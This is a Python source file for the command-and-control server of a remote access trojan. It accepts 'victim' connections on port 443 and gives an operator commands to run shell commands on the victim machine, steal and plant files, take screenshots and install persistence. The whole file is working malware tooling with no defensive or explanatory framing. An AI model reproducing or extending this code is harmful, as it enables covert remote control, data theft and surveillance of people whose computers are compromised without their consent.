import socket
import threading
import cmd
import json
from time import sleep


class RatC2(cmd.Cmd):
    prompt = 'RAT> '

    def __init__(self, host, port):
        super().__init__()
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind((host, port))
        self.sock.listen(1)
        self.session = None
        self.current_id = None

        threading.Thread(target=self.accept_connections, daemon=True).start()

    def accept_connections(self):
        """Handle incoming victim connections"""
        while True:
            client, addr = self.sock.accept()
            self.session = client
            print(f"\n[+] New connection from {addr[0]}")
            self.show_banner(client)

    def show_banner(self, client):
        """Display victim information"""
        try:
            info = json.loads(client.recv(1024).decode())
            self.current_id = info['id']
            print(f"\n[System Info]")
            print(f"ID:       {info['id']}")
            print(f"OS:       {info['os']}")
            print(f"Hostname: {info['hostname']}")
            print(f"User:     {info['user']}")
            self.prompt = f"RAT ({info['hostname']})> "
            print(self.prompt, end='', flush=True)
        except Exception as e:
            print(f"Connection error: {str(e)}")

    def do_shell(self, arg):
        """Execute command on victim: shell <command>"""
        self._send_command(arg)

    def do_download(self, arg):
        """Download file from victim: download <remote_path>"""
        self._send_command(f'download {arg}')
        self._receive_file(arg.split('/')[-1])

    def do_upload(self, arg):
        """Upload file to victim: upload <local_path> <remote_path>"""
        try:
            local, remote = arg.split()
            self._send_command(f'upload {remote}')
            self._send_file(local)
        except ValueError:
            print("Usage: upload <local_path> <remote_path>")

    def do_screenshot(self, arg):
        """Take victim screenshot: screenshot"""
        self._send_command('screenshot')
        self._receive_file('screenshot.png')

    def do_persist(self, arg):
        """Install persistence: persist"""
        self._send_command('persist')

    def do_kill(self, arg):
        """Remove RAT from victim: kill"""
        self._send_command('kill')

    def _send_command(self, cmd):
        if not self.session:
            print("No active session")
            return
        try:
            self.session.sendall(cmd.encode())
            response = self.session.recv(4096).decode()
            print(response)
        except Exception as e:
            print(f"Command failed: {str(e)}")

    def _send_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        sleep(0.5)
                        self.session.send(b'<END>')
                        break
                    self.session.sendall(chunk)
            print(f"File {file_path} uploaded")
        except Exception as e:
            print(f"Upload failed: {str(e)}")

    def _receive_file(self, file_name):
        try:
            with open(file_name, 'wb') as f:
                while True:
                    chunk = self.session.recv(4096)
                    if chunk.endswith(b'<END>'):
                        f.write(chunk[:-5])
                        break
                    f.write(chunk)
            print(f"File {file_name} downloaded")
        except Exception as e:
            print(f"Download failed: {str(e)}")

    def do_exit(self, arg):
        """Exit C2 server"""
        print("Shutting down...")
        self.session.close()
        self.sock.close()
        return True


if __name__ == '__main__':
    print("Starting RAT C2 server...")
    RatC2('0.0.0.0', 443).cmdloop()